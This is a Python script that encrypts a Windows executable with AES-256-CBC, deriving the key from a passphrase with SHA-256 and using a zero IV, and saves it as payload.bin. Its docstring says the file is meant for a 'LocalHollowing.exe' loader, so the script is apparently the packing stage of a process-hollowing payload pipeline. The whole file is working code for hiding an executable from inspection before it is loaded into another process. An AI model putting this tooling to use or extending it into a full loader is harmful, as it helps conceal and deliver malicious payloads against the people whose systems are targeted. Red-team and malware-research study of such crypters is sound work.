#!/usr/bin/env python3
"""
encrypt_and_convert.py - Encrypt PE with AES-256 using a passphrase.

Produces:
  <output_dir>/payload.bin  - AES-256-CBC encrypted PE (key=SHA256(passphrase))

Usage:
  python encrypt_and_convert.py <input_pe> <output_dir> --passphrase <passphrase>

The same passphrase must be passed to LocalHollowing.exe at runtime.
The loader derives the AES key identically via CryptoAPI SHA-256.

Requires: pip install pycryptodome
"""

import sys
import os
import hashlib
import argparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


def aes_encrypt(plaintext: bytes, passphrase: str):
    """AES-256-CBC with IV=0x00*16, key=SHA256(passphrase). Matches CryptoAPI CryptDeriveKey."""
    k = hashlib.sha256(passphrase.encode()).digest()
    iv = b'\x00' * 16
    padded = pad(plaintext, AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    return cipher.encrypt(padded)


def main():
    parser = argparse.ArgumentParser(
        description="Encrypt PE with AES-256-CBC for LocalHollowing pipeline"
    )
    parser.add_argument("input_pe", help="Path to the PE to encrypt")
    parser.add_argument("output_dir", help="Output directory")
    parser.add_argument(
        "--passphrase", "-p", required=True,
        help="Passphrase for AES-256 key derivation (SHA-256). "
             "Must match the passphrase passed to the loader at runtime."
    )
    args = parser.parse_args()

    if not os.path.isfile(args.input_pe):
        print(f"[-] Input file not found: {args.input_pe}")
        sys.exit(1)

    os.makedirs(args.output_dir, exist_ok=True)

    with open(args.input_pe, 'rb') as f:
        plaintext = f.read()

    ciphertext = aes_encrypt(plaintext, args.passphrase)

    # output/payload.bin
    payload_path = os.path.join(args.output_dir, 'payload.bin')
    with open(payload_path, 'wb') as f:
        f.write(ciphertext)

    print(f"[+] payload.bin  : {len(ciphertext)} bytes -> {payload_path}")
    print(f"[+] passphrase   : {args.passphrase}")
    print(f"[+] key (SHA-256): {hashlib.sha256(args.passphrase.encode()).hexdigest()}")


if __name__ == '__main__':
    main()
